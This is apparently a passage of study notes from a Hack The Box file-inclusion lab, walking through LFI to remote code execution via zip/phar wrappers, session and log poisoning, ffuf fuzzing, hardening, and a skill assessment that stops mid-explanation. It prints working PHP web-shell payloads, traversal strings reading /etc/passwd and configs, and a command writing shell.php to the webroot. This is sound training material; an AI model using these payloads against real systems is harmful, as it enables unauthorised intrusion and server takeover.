- **Note:** Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

**Upload the zip file**

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/14.png)

**ZIP wrapper usage:** 

```
zip://archive.zip#dir/file.txt
```

The `#` is used to refer to a specific file inside the archive. So first specify the images directory, then refer to the uploaded archive (`shell.jpg`) then use `#` (URL encode) to refer to the file inside the archive, which is →  `shell.php` lastly use &cmd

```bash
/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/15.png)

- Note, the `?` is used at the start of the query (`?language`), and if there is second query to send like `cmd` we use `&`

---

1. **Phar Upload**

Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:

```bash
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
                                                                                
$ ls
shell.jpg  shell.php
                                                                 
$ file shell.jpg 
shell.jpg: PHP phar archive with SHA256 signature
```

The `phar://`wrapper expects a specific format to locate a file inside an archive:

```
phar://[path_to_archive]/[file_inside_archive]
```

Now we can interact with the PHP phar archive by specifying the archive (`shell.jpg`) then use / (URL encode) to refer to the file inside the archive (`shell.txt`). Note we URL encode the `/` because the web server or the application’s internal filtering might interpret it as a directory traversal attempt or a path separator for the *actual* filesystem, rather than a separator *inside* the Phar archive.

```bash
/index.php?language=phar://./profile_images/shell.jpg%2fshell.txt&cmd=id
```

Both the `zip` and `phar` wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.

### Log Poisoning

We have seen in previous sections that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the `Execute` privileges. The attacks we will 
discuss in this section all rely on the same concept: 

Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate`the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.

---

1. **PHP Session Poisoning**

Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These 
details are stored in `session` files on the back-end, these files are saved in: 

- `/var/lib/php/sessions/` on Linux
- and in `C:\Windows\Temp\` on Windows.

The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. 

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/16.png)

So our session file will be saved as:

```bash
var/lib/php/sessions/sess_cta01nrdhgbanr5ig9gdg7eag0
```

First select a language and try to include this session file through the LFI vulnerability  

```bash
/index.php?language=/var/lib/php/sessions/sess_cta01nrdhgbanr5ig9gdg7eag0
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/17.png)

```bash
selected_language|s:6:"en.php";
preference|s:7:"English";  
```

We can see that the session file contains two values: 

- `selected_language`: shows the selected language page
- `preference`: shows the selected language

The `preference` value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the `page` value is under our control, as we can control it through the `?language=` parameter.

Let's try setting the value of `selected_language` a custom value (e.g. `language parameter`) and see if it changes in the session file. We can do so by simply visiting the page with:

```bash
/index.php?language=test
```

Now, let's include the session file once again to look at the contents: 

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/18.png)

This time, the session file contains `test` instead of `es.php`, which confirms our ability to control the value of `selected_language` in the session file. Our next step is to perform the `poisoning` step by writing PHP code to the session file. 

```bash
/index.php?language=<?php system($_GET['cmd']);?>

# URL encode
/index.php?language=<%3fphp+system($_GET['cmd'])%3b%3f>
```

Now include the poisoned session file along with the `&cmd=id` to execute a commands:

```bash
 /index.php?language=/var/lib/php/sessions/sess_cta01nrdhgbanr5ig9gdg7eag0&cmd=id
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/19.png)

Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion, as shown in the image below, after I typed the next command: 

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/20.png)

Instead of just running simple commands like `id` or `ls`, you use your poisoned session to tell the server to create a **new** PHP file in a directory you can access (usually the web root).

```bash
/index.php?language=/var/lib/php/sessions/sess_cta01nrdhgbanr5ig9gdg7eag0&cmd=echo+'<%3fphp+system($_GET["cmd"])%3b+%3f>'+>+shell.php

# URL Decode
/index.php?language=/var/lib/php/sessions/sess_cta01nrdhgbanr5ig9gdg7eag0&cmd=echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Once this is done, you no longer need the session file. You just go to:

```
http://target.com/shell.php?cmd=id
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/21.png)

---

1. **Server Log Poisoning** 

Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs.

- `Nginx` logs are readable by low privileged users by default (e.g. `www-data`)
- while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.

Log Locations by default:

- Apache
    - `/var/log/apache2/` on Linux
    - `C:\xampp\apache\logs\` on Windows.
- `nginx`
    - `/var/log/nginx/` on Linux
    - `C:\nginx\log\` on Windows
- If not found in these locations, we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations

So, let's try including the Apache access log from `/var/log/apache2/access.log`, and see what we get:

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/22.png)

As we can see, we can read the log. The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header. As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.

- **Tip:** Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.

Modify the User-Agent header with any text and check the log

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/23.png)

- **Note:** As all requests to the server get logged, we can poison any request to the web application, and not necessarily the LFI one as we did above.

As expected, our custom User-Agent value is visible in the included log file. Now, we can poison the `User-Agent` header by setting it to a basic PHP web shell:

```bash
User-Agent: <?php system($_GET['cmd']);?>
```

Now, when the server includes the `access.log` it will see the PHP code that we put in the `user-Agent` header in the log file, and will execute it 

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/24.png)

The same thing applys for any other logs, we first confime if we have read permission on them, then see what kind of data it logs and if we can poison it.

- `/proc/self/environ` or `/proc/self/fd/N`
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

if the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, 
the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.

### Resources for Further Learning

- **PHP Official Documentation:** [PHP Stream Wrappers](https://www.php.net/manual/en/wrappers.php.php) – Understand the intended functionality of `php://` streams.
- **PayloadsAllTheThings (GitHub):** [File Inclusion/PHP Filters](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) – A comprehensive repository of LFI payloads and filter chain techniques.
- **HackTricks:** [PHP Filters Guide](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters) – Detailed walkthroughs on turning LFI into Remote Code Execution (RCE) using filters.
- **Synacktiv:** [PHP Filter Chains](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it) – Research on the tool that automates RCE through filter sequences.

## Automation

### Automated Scanning

---

1. **Parameter Fuzzing**

Standard HTML forms are usually well-secured, but web applications often contain **hidden parameters** not linked to the UI.

In our example in this section it only view the `index.php` and no other parameter or forms

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/25.png)

If we want to test for LFI, we need to discover any **hidden parameters** linked to the `index.php`. Before starting fuzzing, we need to identify the response `content-length` So we can filter non-existing parameters based on it. Here, I tested random parameters, all of which resulted in the same response `content-length=2309` 

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/26.png)

Now we can filter the results based on it

```bash
$ ffuf -u "http://154.57.164.74:31975/index.php?FUZZ=test" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 2309 -s
view
```

The `view` parameter returned a different `content-length`response 

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/27.png)

---

1. **LFI wordlists**

Now we know a potentially vulnerable parameter, we can automate the test to see if it is vulnerable to any common LFI payload.

- Wordlists → [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) , [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)

Filter the results based on the  `Content-Length: 1935` 

```bash
$ ffuf -u "http://154.57.164.74:31975/index.php?view=FUZZ" -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt  -fs 1935 -s
../../../../../../../../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../../etc/passwd
```

As we can see, the scan yielded several LFI payloads that can be used to exploit the vulnerability and we confirmed the vulnerability after we tested it manually:

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/28.png)

---

1. **Fuzzing Server Files**

Automated scanning is also used to map the internal environment of the server. This is critical for moving from simple file reading to **Remote Code Execution (RCE)**.

| Target | Purpose |
| --- | --- |
| **Webroot Path** | Finding the absolute path (e.g., `/var/www/html/`) to locate uploaded files. |
| **Server Configurations** | Reading files like `apache2.conf` to find DocumentRoots and log locations. |
| **Server Logs** | Identifying `access.log` or `error.log` locations to perform **Log Poisoning**. |

From the **LFI wordlist fuzzing,** we discovered: 

```bash
../../../../../../../../../../../../../../../../../../../../../etc/passwd
```

and we can use this finding to determine where the website is physically stored on the server's hard drive. 

- Every `../` moves you one directory up toward the root (`/`).
- If four `../` got you to the root (where `etc/` lives), it tells you that the current file (`index.php`) is nested **4 levels deep** from the root.

```bash
$ ffuf -u "http://154.57.164.74:31975/index.php?view=../../../../../../../../../../../../../../../../../FUZZ/index.php" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt   -fs 1935 -s
var/www/html/
```

In Linux, if you are at the root directory (`/`) and you keep typing `../`, you simply **stay at the root**. You cannot go higher than `/`. By using roughly 17 `../` sequences, you ensured that no matter how deep the web directory was, you were **guaranteed** to be sitting at the absolute root of the file system.

Note: we did discover the webroot location but don't test it manually because you will create **infinite recursion loop.** This is because when you request `index.php?view=../../../../var/www/html/index.php`the following logic occurred on the server:

- The server starts executing **`index.php`**.
- It sees your input: "Include the file located at `/var/www/html/index.php`."
- Because `/var/www/html/index.php` **is the exact same file** currently running, it opens a second instance of `index.php` inside the first one.
- That second instance sees the same `view` parameter and tries to include `index.php` a third time.
- This repeats forever (or until the server runs out of memory/time).

---

1. **Server Logs/Configurations**

Fuzz for server Logs/ Configuration for LFI 

- Wordlists:  [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows),  [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) ,

```bash
$ ffuf -u "http://154.57.164.72:30450/index.php?view=../../../../../../../../../../../../../../../../../FUZZ" -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-WordList-Linux.txt    -fs 1935 -s
/etc/apache2/mods-enabled/deflate.conf
/etc/apache2/mods-available/dir.conf
/etc/apache2/mods-enabled/alias.conf
/etc/apache2/mods-available/ssl.conf
/etc/apache2/mods-enabled/mime.conf
/etc/apache2/mods-available/autoindex.conf
/etc/adduser.conf
/etc/apache2/apache2.conf
/etc/bash.bashrc
/etc/ca-certificates.conf.dpkg-old
/etc/ca-certificates.conf
/etc/deluser.conf
/etc/debian_version
/etc/debconf.conf
/etc/fstab
/etc/group
/etc/group-
/etc/host.conf
/etc/hostname
/etc/hosts
/etc/hosts.deny
/etc/hosts.allow
/etc/issue.net
/etc/issue
/etc/ld.so.conf
/etc/ldap/ldap.conf
/etc/login.defs
/etc/mtab
/etc/mysql/my.cnf
/etc/networks
/etc/os-release
/etc/passwd-
/etc/passwd
/etc/pam.conf
/etc/profile
/etc/apache2/ports.conf
/etc/resolv.conf
/etc/security/access.conf
/etc/security/group.conf
/etc/security/limits.conf
/etc/security/namespace.conf
/etc/security/pam_env.conf
/etc/security/sepermit.conf
/etc/security/time.conf
/etc/ssh/sshd_config
/etc/sysctl.conf
/etc/sysctl.d/10-console-messages.conf
/etc/sysctl.d/10-network-security.conf
/etc/timezone
/etc/apache2/mods-available/deflate.conf
/etc/apache2/mods-available/proxy.conf
/etc/apache2/envvars
/proc/meminfo
/proc/devices
/proc/cpuinfo
/proc/net/tcp
/proc/self/cmdline
/proc/net/udp
/proc/self/mounts
/proc/self/status
/proc/version
/proc/self/stat
/etc/apache2/mods-available/setenvif.conf
/etc/apache2/mods-enabled/status.conf
/etc/apache2/mods-available/mime.conf
/etc/apache2/mods-enabled/dir.conf
/etc/apache2/mods-enabled/negotiation.conf
/usr/share/adduser/adduser.conf
```

View the apache configuration 

```bash
$ curl "http://154.57.164.72:30450/index.php?view=../../../../../../../../../../../../../../../../../etc/apache2/apache2.conf" 

# These need to be set in /etc/apache2/envvars
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}
..
ErrorLog ${APACHE_LOG_DIR}/error.log
...
LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
LogFormat "%h %l %u %t \"%r\" %>s %O" common
LogFormat "%{Referer}i -> %U" referer
LogFormat "%{User-agent}i" agent

```

  `ErrorLog ${APACHE_LOG_DIR}/error.log`->  The path is hidden behind a variable(`${APACHE_LOG_DIR}`). So we need to read `/etc/apache2/envvars` to find the real path 

```bash
$ curl "http://154.57.164.72:30450/index.php?view=../../../../../../../../../../../../../../../../../etc/apache2/envvars" 

# this won't be correct after changing uid
unset HOME

# for supporting multiple apache2 instances
if [ "${APACHE_CONFDIR##/etc/apache2-}" != "${APACHE_CONFDIR}" ] ; then
        SUFFIX="-${APACHE_CONFDIR##/etc/apache2-}"
else
        SUFFIX=
fi

# Since there is no sane way to get the parsed apache2 config in scripts, some
# settings are defined via environment variables and then used in apache2ctl,
# /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX

```

In `apache2.conf`, the log was defined as `${APACHE_LOG_DIR}/access.log`.In this file, you see: `export APACHE_LOG_DIR=/var/log/apache2$SUFFIX`.Since `$SUFFIX` is empty (based on the logic at the top of the script), we now have the absolute path to the logs:

- **Access Log:** `/var/log/apache2/access.log`
- **Error Log:** `/var/log/apache2/error.log`

The test result in failure because these logs dont have read permission for the current user. 

> **Note:** Of course, we can simply use a wordlist to find the logs, as multiple wordlists we used in this sections did show the log location. But this exercises shows us how we can manually go through identified files, and then use the information we find to further identify more files and important information. This is quite similar to when we read different file sources in the `PHP filters` section, and such efforts may reveal previously unknown information about the web application, which we can use to further exploit it.
> 

---

1. **LFI Tools**

The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). 

---

### LFI Prevention

This module details the critical defensive strategies required to mitigate and prevent File Inclusion (LFI/RFI) and Directory Traversal vulnerabilities. The focus is on a **defense-in-depth** approach, ranging from secure coding practices to server-level hardening.

---

**1. Secure Coding Practices**

The most effective defense is eliminating user-controlled input in file inclusion functions.

- **Whitelisting:** Instead of letting users specify a path, use a "match" system. Map user-supplied IDs (e.g., `?page=1`) to static file paths on the back-end via a database or JSON map.
- **Basename:** Use functions like PHP’s `basename()` to strip directory paths and return only the filename. This prevents attackers from using `../` to escape the directory.
- **Recursive Sanitization:** Implement logic to recursively remove traversal strings. A simple search-and-replace is insufficient because attackers use nested strings (e.g., `....//`); a `while` loop ensures all instances are stripped.

---

**2. Web Server Hardening**

Configuring the environment correctly can neutralize an exploit even if a vulnerability exists in the code.

- **Disable Remote Inclusion:** In PHP, set `allow_url_fopen` and `allow_url_include` to **Off** to prevent RCE via Remote File Inclusion (RFI).
- **Filesystem Sandboxing:** Use `open_basedir` to lock the application into a specific directory (e.g., `/var/www`), preventing access to sensitive files like `/etc/passwd`.
- **Containerization:** Running applications in **Docker** provides a natural layer of isolation from the host operating system.
- **Disable Dangerous Modules:** Ensure modules like `PHP Expect` (which allows system command execution) are disabled.

---

**3. Web Application Firewalls (WAF)**

A WAF serves as a proactive shield to detect and block malicious patterns.

- **ModSecurity:** A popular choice that can be run in "permissive mode" to log potential attacks without breaking legitimate traffic, allowing defenders to fine-tune rules.
- **Detection vs. Prevention:** Even if not in blocking mode, a WAF provides an early warning system.

---

**4. The Philosophy of Hardening**

Hardening is not about making a system "un-hackable," but about **increasing the cost of attack** and **reducing detection time**.

- **Visibility:** A hardened system forces attackers to use noisier, more complex payloads, which are more likely to trigger alerts.
- **Continuous Testing:** Systems must be regularly tested and logs monitored, especially after the release of new zero-day vulnerabilities in common frameworks (e.g., Django, Rails, Apache).

---

**Question:** **Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ________ reasons.** 

```bash
htb-student@lfi-harden:/var/www/html$ cat /etc/php/7.4/apache2/php.ini  | grep allow_url_include
allow_url_include = Off
htb-student@lfi-harden:/var/www/html$ cat /etc/php/7.4/apache2/php.ini  | grep allow_url_fopen
allow_url_fopen = On
htb-student@lfi-harden:/var/www/html$ cat /etc/php/7.4/apache2/php.ini  | grep disable_functions
disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,

```

| **Setting** | **Status** | **Impact on Attack** |
| --- | --- | --- |
| **`allow_url_include`** | **Off** | **RFI is Disabled.** You cannot execute remote code directly via URL inclusion. |
| **`allow_url_fopen`** | **On** | **External Streams Enabled.** You can read remote files (SSRF), but you can't *execute* them as PHP. |

As for `disable_functions` directive it is used to block functions and we can see the system() function is not presented. Before editing the php.ini file to disable it, let's test what will happen if it isn't disabled. Start by creating a web_shell.php in the webroot 

```bash
htb-student@lfi-harden:/var/www/html$ echo "<?php system($_GET['cmd']);?>" > /tmp/web_shell.php

htb-student@lfi-harden:/var/www/html$ sudo mv /tmp/web_shell.php .

htb-student@lfi-harden:/var/www/html$ ls -al
total 24
drwxr-xr-x 2 root        root         4096 Feb 11 13:17 .
drwxr-xr-x 3 root        root         4096 Nov  6  2020 ..
-rw-r--r-- 1 root        root        10918 Nov  6  2020 index.html
-rw-rw-r-- 1 htb-student htb-student    25 Feb 11 13:16 web_shell.php

```

Then start the apaches 

```bash
sudo systemctl restart apache2
```

Test for RCE 

```bash
$ curl "http://10.129.32.252/web_shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The file get executed successfully. Now lets edit the php.ini to block the `system()` function

```bash
htb-student@lfi-harden:/var/www/html$ cat /etc/php/7.4/apache2/php.ini  | grep disable_functions
disable_functions = system,....
```

Once the Apache restarted, we will no longer get results from the web_shell.php

```bash
$ curl "http://10.129.32.252/web_shell.php?cmd=id"
```

check the error.log:

```bash
htb-student@lfi-harden:/var/www/html$ grep "system() has been disabled" /var/log/apache2/error.log
[Wed Feb 11 13:36:17.344016 2026] [php7:warn] [pid 2557] [client 10.10.16.155:37196] PHP Warning:  system() has been disabled for security reasons in /var/www/html/web_shell.php on line 1
[Wed Feb 11 13:36:22.633973 2026] [php7:warn] [pid 2559] [client 10.10.16.155:37210] PHP Warning:  system() has been disabled for security reasons in /var/www/html/web_shell.php on line 1
```

## Skill Assessment

## Scenario

You have been contracted by `Sumace Consulting Gmbh` to carry out a web application penetration test against their main website.During the kickoff meeting, the CISO mentioned that last year's penetration test resulted in zero findings, however they have added a job application form since then, and so it may be a point of interest.

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/s1.png)

After submitting the application form, it will redirect us to `/thanks.php?n=test` where the test is the client name

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/s2.png)

It only used to display the name (no exection involves)

in the apply.php source code, the images uploaded to 

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/s3.png)

```bash
<img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c"
```

### Fuzzing

Directory fuzzing

```bash
─$ ffuf -w /usr/share/wordlists/dirb/common.txt  -u "http://154.57.164.74:32330/FUZZ" -e .php -s -mc 302,301,200 -fs 3405
api
apply.php
contact.php
css
images
thanks.php
uploads
```

I also fuzzed the contact.php parameter and it returned this result:

```bash
─$ ffuf -u "http://154.57.164.74:32330/contact.php?FUZZ=test" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt  -s -fs 1771
region
```

### Searching for a file inclusion entry point

Potential endpoints

```bash
/api/image.php?p=<imagehash>
/contact.php?region=tezt
```

### LFI fuzzing

The image.php only views the content without executing it

```bash
─$ ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt    -u "http://154.57.164.66:32699/api/image.php?p=FUZZ"  -s  -fs 0
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//etc/passwd
....//....//....//....//etc/passwd
```

Confirming the exploitation:

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/s4.png)

I also tried with the region parameter 

```bash
 ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt    -u "http://154.57.164.66:32699/contact.php?region=FUZZ"  -s  -fs 1191,1239
```

But that didn't work.

### Information Disclosure via LFI

By confirming our entry point, we can start to disclose internal files

```bash
$ ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-WordList-Linux    -u "http://154.57.164.66:32699/api/image.php?p=....//....//....//....//FUZZ"  -s  -fs 0 
/etc/adduser.conf
/etc/bash.bashrc
/etc/debian_version
/etc/deluser.conf
/etc/debconf.conf
/etc/fstab
/etc/group-
/etc/group
/etc/host.conf
/etc/hostname
/etc/hosts
/etc/issue
/etc/issue.net
/etc/ld.so.conf
/etc/login.defs
/etc/mtab
/etc/motd
/etc/nginx/nginx.conf
/etc/passwd
/etc/pam.conf
/etc/os-release
/etc/passwd-
/etc/profile
/etc/resolv.conf
/etc/security/access.conf
/etc/security/group.conf
/etc/security/time.conf
/etc/security/namespace.conf
/etc/security/pam_env.conf
/etc/security/sepermit.conf
/etc/security/limits.conf
/etc/sysctl.conf
/etc/timezone
/proc/meminfo
/proc/self/cmdline
/proc/devices
/proc/net/udp
/proc/net/tcp
/proc/self/stat
/proc/self/mounts
/proc/version
/proc/self/status
/proc/cpuinfo
/var/log/nginx/error.log
/var/log/nginx/access.log
                          
```

The first thing we do is to view the website configuration file

```bash
GET /api/image.php?p=....//....//....//....///etc/nginx/nginx.conf 
```

```bash
user www-data;
worker_processes auto;
pid /run/nginx.pid;
error_log /var/log/nginx/error.log;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	# server_tokens off;

	# server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	access_log /var/log/nginx/access.log;

	##
	# Gzip Settings
	##

	gzip on;

	# gzip_vary on;
	# gzip_proxied any;
	# gzip_comp_level 6;
	# gzip_buffers 16 8k;
	# gzip_http_version 1.1;
	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}

#mail {
#	# See sample authentication script at:
#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#	# auth_http localhost/auth.php;
#	# pop3_capabilities "TOP" "USER";
#	# imap_capabilities "IMAP4rev1" "UIDPLUS";
#
#	server {
#		listen     localhost:110;
#		protocol   pop3;
#		proxy      on;
#	}
#
#	server {
#		listen     localhost:143;
#		protocol   imap;
#		proxy      on;
#	}
#}
```

Since the entrypoint only reads the content, we will search for other vulnerabilities by reading the source code. the `content.php` page:

```php
 <?php
                    $region = "AT";
                    $danger = false;

                    if (isset($_GET["region"])) {
                        if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
                            echo "'region' parameter contains invalid character(s)";
                            $danger = true;
                        } else {
                            $region = urldecode($_GET["region"]);
                        }
                    }

                    if (!$danger) {
                        include "./regions/" . $region . ".php";
                    }
                    ?>
```

So the region is used to execute php files by appending the value name to `.php`

```php
?p=....//....//....//....//var/www/html/regions/AT.php
```

This is the `application.php` file to see where our form is uploaded to

```php
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```

`$ext = end((explode(".", $file_name)));`The script splits the filename at every dot and grabs the very last part. If you upload `malicious.php.jpg`, the extension is `jpg`. So the filename is renamed like this

```php
fcb513f761ea59d2e6c1e6ab120ca650.php
```

I uploaded the form with the malicious.php.jpg file which contains web shell

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/s5.png)

### Testing RCE  via LFI

Now we will try to exploit the vulnerability that exists in `content.php` file, the vulnerability lies in these lines: 

```php
if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
    // ... block it ...
} else {
    $region = urldecode($_GET["region"]); // THE TRAP
}
```

- **How PHP handles URLs:** When a request hits a PHP server, the superglobal `$_GET` is **already** URL-decoded once by the server.
- **The Second Layer:** By calling `urldecode()` manually *after* the check, the developer allows an attacker to hide dangerous characters inside a second layer of encoding.

Double URL encoding is the process of encoding a character, and then encoding the **percent sign (`%`)** of that resulting code again. The key to double encoding is knowing that the ASCII code for the percent sign (`%`) is **25** in hexadecimal. Therefore, `%` becomes **`%25`** when URL-encoded.

**Example: The Dot (`.`)**

1. Original Character: `.`
2. Single Encode: `%2e`
